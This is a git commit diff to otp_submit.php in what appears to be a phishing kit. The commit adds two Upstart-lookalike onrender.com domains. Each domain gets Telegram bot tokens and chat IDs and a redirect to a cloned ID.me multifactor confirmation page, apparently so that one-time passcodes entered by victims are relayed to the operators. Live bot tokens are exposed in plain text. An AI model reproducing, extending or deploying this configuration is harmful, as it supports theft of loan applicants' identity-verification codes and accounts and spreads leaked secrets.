da06c875ba34dadabb4039b7e7e3cf203a2cf78c
ghost-hub1 <37017254+ghost-hub1@users.noreply.github.com>
2025-08-03 15:11:17 +0100

    +2 domains

--- otp_submit.php
+++ otp_submit.php
@@ -16,10 +16,27 @@ $site_map = [
     'upstarts.onrender.com' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ['token' => '', 'chat_id' => '']
+            ['token' => '8187021949:AAED4PdfxR4o4oRJjLMht3UnBDp52FFG8Ok', 'chat_id' => '5768557636']
         ],
         'redirect' => 'https://upstarts.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
     ],
+
+    'upstart-l69v.onrender.com' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
+        ],
+        'redirect' => 'https://upstart-l69v.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
+    ],
+
+    'upstartloans-704y.onrender.com' => [
+        'bots' => [
+            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
+            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
+        ],
+        'redirect' => 'https://upstartloans-704y.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php'
+    ],
+
 
 
 ];
